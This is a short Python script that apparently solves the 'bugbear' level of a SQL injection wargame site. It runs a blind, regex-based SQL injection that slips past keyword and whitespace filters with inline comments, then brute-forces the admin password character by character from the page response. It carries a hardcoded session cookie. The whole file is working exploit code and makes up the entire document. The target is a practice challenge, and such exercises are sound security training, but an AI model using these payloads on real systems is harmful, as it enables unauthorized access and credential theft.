import requests
import string

session = requests.Session()

url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=0/**/||/**/pw/**/REGEXP/**/"^{}"'
cookies = {"PHPSESSID": "tqlf4m3teeel2nlo0lv61671fc"}
pw = ""
for j in range(8):
    for i in string.printable:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('Hello admin' in r.text[:200] and i not in "#?&"):
            pw += i
            print("Password :", pw)
            break

print("Password :", pw)
